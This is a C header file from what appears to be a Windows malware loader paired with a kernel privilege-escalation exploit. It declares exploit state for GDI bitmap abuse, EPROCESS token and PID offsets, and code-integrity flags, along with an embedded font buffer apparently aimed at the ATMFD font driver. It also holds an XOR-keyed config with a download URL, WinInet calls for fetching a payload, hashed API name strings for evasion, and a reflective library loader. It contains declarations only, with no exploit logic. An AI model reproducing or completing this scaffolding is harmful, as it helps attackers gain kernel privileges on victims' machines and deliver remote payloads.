#ifndef _LOADER_H
#define _LOADER_H

#include <Windows.h>
#include "winapi.h"

typedef struct _EXPLOIT_LOCALS
{
	BOOL is64;
	int is7;
	int is8;
	int is81;
	int isvista;
	int isxp;
	int firstfailed;
	HBITMAP thehandle;
	unsigned int kproc;
	size_t gDta_size;
	unsigned char *gDta;
	PIMAGE_DOS_HEADER gMZDta;
	PIMAGE_NT_HEADERS32 gPEDta;
	PIMAGE_NT_HEADERS64 gPEPDta;
	unsigned int ImageBase;
	BOOL bIsWow64;
	HMODULE NTosHandle;
	char tmpbuf[256];
	char cipath[256];
	PVOID kBase;
	PVOID ciBase;
	unsigned int eprocess_offset;
	unsigned int flink_offset;
	unsigned int pid_offset;
	unsigned int token_offset;
	unsigned int job_offset;
	unsigned int g_CiEnabled;
	unsigned int g_CiOptions;
	HWND mywindow;
	HBITMAP hBitmap;
	HBITMAP hBitmapslarge[1000];
	HBITMAP testbitmap;
	unsigned int gditable; //address of gdi shared handle table
	//char inbuf[0x20009];
	//char outbuf[0x20009];

} EXPLOIT_LOCALS, *PEXPLOIT_LOCALS;

typedef struct _LOADER_CONFIG
{
	DWORD dwMagic;
	DWORD dwXorKey;
	CHAR strUrl[150];

	CHAR strKernel32[9];
	CHAR strNtDll[6];
	CHAR strWinInet[8];
	CHAR strShell32[8];
	CHAR strGdi32[6];
	CHAR strWs2_32[7];
	CHAR strWsock32[8];
	CHAR strMsvcr[10];

	CHAR strVirtualAlloc[13];
	CHAR strVirtualProtect[15];

	CHAR strCreateFileW[12];
	CHAR strWriteFile[10];
	CHAR strCloseHandle[12];
	CHAR strGetShortPathNameW[18];
	CHAR strGetTempPathW[13];
	CHAR strSHGetKnownFolderPath[21];
	CHAR strLoadLibraryW[13];
	CHAR strFreeLibrary[12];
	CHAR strDeleteFileW[12];

	CHAR strInternetOpenA[14];
	CHAR strInternetOpenUrlA[17];
	CHAR strHttpQueryInfoW[15];
	CHAR strInternetReadFileExA[20];
	CHAR strWtoi[6];
	CHAR strExitProcess[12];
	CHAR strExitThread[11];

	/* exploit */

	/* gdi32 */
	CHAR strSetBitmapBits[14];
	CHAR strGetBitmapBits[14];
	CHAR strDeleteObject[13];
	CHAR strCreateBitmap[13];

	/* kernel32 */
	CHAR strIsWow64Process[15];
	CHAR strGetCurrentProcess[18];
	CHAR strGetVersionExA[18];
	CHAR strGetModuleHandle[20];
	CHAR strLocalAlloc[11];
	CHAR strLocalFree[10];
	CHAR strGetWindowsDirectory[30];
	CHAR strDuplicateHandle[20];
	CHAR strReadFile[10];
	CHAR strGetFileSize[20];
	CHAR strOutputDebugStringA[20];
	CHAR strWaitForSingleObject[20];
	CHAR strGetProcessHeap[20];
	CHAR strHeapAlloc[20];
	CHAR strHeapFree[20];
	CHAR strVerSetConditionMask[20];
	CHAR strVerifyVersionInfoA[20];
	CHAR strGetCurrentProcessId[20];
	CHAR strSleep[10];

	/* ws2_32 */
	CHAR strHtonl[6];
	CHAR strHtons[6];
	CHAR strAddFontResourceEx[22];
	
	CHAR wKernel[60];
	CHAR wPsGetCurrentProcess[30];


	/* msvcrt */
	CHAR strSnprintf[10];
	CHAR strMalloc[10];
	CHAR strFree[10];
	CHAR strFopen[10];
	CHAR strFclose[10];
	CHAR strFtell[10];
	CHAR strFseek[10];
	CHAR strFread[10];

	CHAR strExportName[9];
	CHAR strUserAgent[200];


	/* exploit strings */
	CHAR strLpLoaderConfig[40];
	CHAR strLocalsSize[30];
	CHAR strFiringExploit[20];
	CHAR strNoMoreExploit[20];
	CHAR strVtableLoaded[30];
	CHAR strExploit[15];
	CHAR strKbase[10];
	CHAR strRtlGetCurrentPeb[20];
	CHAR strNamedEscape[15];
	CHAR strGdiTable[20];
	WCHAR strAtmfd[10];
	CHAR strBitmapFailed[20];
	CHAR strFontEgg[10];
	CHAR strFontFound[20];
	CHAR strTraversingProcesses[30];
	CHAR strCalc[10];
	CHAR strTokenRestore[20];
	CHAR strBail[15];
	CHAR strProcessInternal[30];
	CHAR strWinSta0[20];
	CHAR strNtquerysysteminformation[30];
	CHAR strSystemRootCI[30];
	CHAR strSysnative[20];
	CHAR strSystenativeCI[20];
	int  strSlash;
	DWORD dwFontEgg;
	unsigned char foofont[755256]; //755255
	
		
} LOADER_CONFIG, *PLOADER_CONFIG;



typedef struct _VTABLE
{
	PLOADER_CONFIG lpLoaderConfig;

	GETPROCADDRESS GetProcAddress;
	LOADLIBRARYA LoadLibraryA;
	VIRTUALALLOC VirtualAlloc;
	VIRTUALPROTECT VirtualProtect;
	CREATEFILEW CreateFileW;
	WRITEFILE WriteFile;
	CLOSEHANDLE CloseHandle;
	GETSHORTPATHNAMEW GetShortPathNameW;
	GETTEMPPATHW GetTempPathW;
	SHGETKNOWNFOLDERPATH SHGetKnownFolderPath;
	LOADLIBRARYW LoadLibraryW;
	FREELIBRARY FreeLibrary;
	DELETEFILEW DeleteFileW;
	INTERNETOPENA InternetOpenA;
	INTERNETOPENURLA InternetOpenUrlA;
	INTERNETREADFILEEXA InternetReadFileExA;
	HTTPQUERYINFOW HttpQueryInfoW;
	WTOI wtoi;
	EXITPROCESS ExitProcess;
	EXITTHREAD ExitThread;

	/* exploit */

	/* gdi32 */
	SETBITMAPBITS fpSetBitmapBits;
	GETBITMAPBITS fpGetBitmapBits;
	DELETEOBJECT fpDeleteObject;
	CREATEBITMAP fpCreateBitmap;

	/* kernel32 */
	ISWOW64PROCESS fpIsWow64Process;
	GETCURRENTPROCESS fpGetCurrentProcess;
	GETVERSIONEXA fpGetVersionExA;
	GETMODULEHANDLE fpGetModuleHandleA;
	LOCALALLOC fpLocalAlloc;
	LOCALFREE fpLocalFree;
	GETWINDOWSDIRECTORY fpGetWindowsDirectoryA;
	DUPLICATEHANDLE fpDuplicateHandle;
	READFILE fpReadFile;
	GETFILESIZE fpGetFileSize;
	OUTPUTDEBUGSTRINGA fpOutputDebugStringA;
	WAITFORSINGLEOBJECT fpWaitForSingleObject;
	GETPROCESSHEAP fpGetProcessHeap;
	HEAPALLOC fpHeapAlloc;
	HEAPFREE fpHeapFree;
	VERSETCONDITIONMASK fpVerSetConditionMask;
	VERIFYVERSIONINFOA fpVerifyVersionInfoA;
	GETCURRENTPROCESSID fpGetCurrentProcessId;
	SLEEP fpSleep;

	/* ws2_32 */
	HTONL fpHtonl;
	HTONS fpHtons;
	ADDFONTMEMRESOURCEEX fpAddFontMemResourceEx;

	/* msvcrt */
	SNPRINTF fpSnprintf;
	MALLOC fpMalloc;
	FREE fpFree;
	FOPEN fpFopen;
	FREAD fpFread;
	FCLOSE fpFclose;
	FTELL fpFtell;
	FSEEK fpFseek;
	

	/* vars */
	PEXPLOIT_LOCALS locals;
	int is7;

} VTABLE, *PVTABLE;

#define CALC_OFFSET(type, ptr, offset) (type) (((ULONG64) ptr) + offset)
#define CALC_OFFSET_DISP(type, base, offset, disp) (type)((DWORD)(base) + (DWORD)(offset) + disp)
#define CALC_DISP(type, offset, ptr) (type) (((ULONG64) offset) - (ULONG64) ptr)

typedef struct base_relocation_block
{
	DWORD PageRVA;
	DWORD BlockSize;
} base_relocation_block_t;

typedef struct base_relocation_entry
{
	WORD offset : 12;
	WORD type : 4;
} base_relocation_entry_t;

typedef int (WINAPI *CRTMAIN)(DWORD);
typedef int (WINAPI *CRTMAIN64)(DWORD64);
typedef int (WINAPI *EXPORT)();
typedef int (WINAPI *EXPORT2)(DWORD);

void Startup(void);
void Loader( PLOADER_CONFIG lpLoaderConfig);
BOOL LoadVTable( PVTABLE lpTable);
BOOL GetPointers( PGETPROCADDRESS fpGetProcAddress,  PLOADLIBRARYA fpLoadLibraryA,  PHANDLE pKernel32);
HANDLE GetKernel32Handle(void);
DWORD GetStringHash( LPVOID lpBuffer,  BOOL bUnicode,  UINT uLen);



LPVOID _LoadLibrary( PVTABLE lpTable,  LPVOID lpRawBuffer,  LPVOID *lpExport);


#define smallbitmapw64 12
#define smallbitmaph64 7

#define smallbitmapw32 17
#define smallbitmaph32 10

#define largebitmapw 110
#define largebitmaph 100

//obtain kernel address of a gdi handle
/*#define handleaddr(handle) *(unsigned int*)(lpTable->locals->gditable+0x10*(((unsigned int)handle)&0xFFFF))
#define handleaddr64low(handle) *(unsigned int*)(lpTable->locals->gditable+0x18*(((unsigned int)handle)&0xFFFF))
#define handleaddr64high(handle) *(unsigned int*)(lpTable->locals->gditable+0x18*(((unsigned int)handle)&0xFFFF)+4)*/

#define _VER_SET_CONDITION(_m_,_t_,_c_)  ( (_m_)=lpTable->fpVerSetConditionMask((_m_),(_t_),(_c_)) )

int exploit(PVTABLE lpTable);

/* crt */
VOID __MEMSET__( LPVOID p,  int cValue,  size_t dwSize);
LPVOID __MEMCPY__( LPVOID lpDst, LPVOID lpSrc, 	DWORD dwCount);
int __MEMCMP__(unsigned char *s1, unsigned char *s2, size_t n);


// CRT
/*LPVOID __MEMCPY__( LPVOID lpDst,  LPVOID lpSrc,  DWORD dwCount);
VOID __MEMSET__( LPVOID p,  CHAR cValue,  DWORD dwSize);
int __MEMCMP__(unsigned char *s1, unsigned char *s2, size_t n);
int __STRCMP__(const char *s1, const char *s2);
VOID * __MEMCHR__(VOID *s, UCHAR c,UINT n);
INT __STRICMP__(CHAR *s1, CHAR *s2);
CHAR * __STRTOLOWER__(CHAR *str);
INT __TOLOWER__(INT chr);
CHAR * __LSTRRCHR__( CHAR *s,  INT c);
VOID __LSTRCPY__( CHAR dest[],  CHAR source[]);
UINT __LSTRLEN(CHAR *str);
CHAR * __LSTRCAT__(CHAR *s1, CHAR *s2);*/

#endif